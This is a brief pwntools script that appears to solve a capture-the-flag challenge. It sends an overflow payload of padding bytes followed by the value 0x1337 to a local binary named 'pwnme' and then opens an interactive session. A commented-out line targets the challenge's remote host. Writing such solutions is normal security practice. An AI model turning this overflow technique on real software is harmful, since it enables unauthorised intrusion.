#!/usr/bin/env python3

from pwn import *

print("Start pwning")

sh = process("./pwnme")
#sh = remote("0.cloud.chals.io",19595)

payload = b"A" * (0x110 - 4)

payload += p32(0x1337)
payload += b"\n"

sh.send(payload)

sh.interactive()

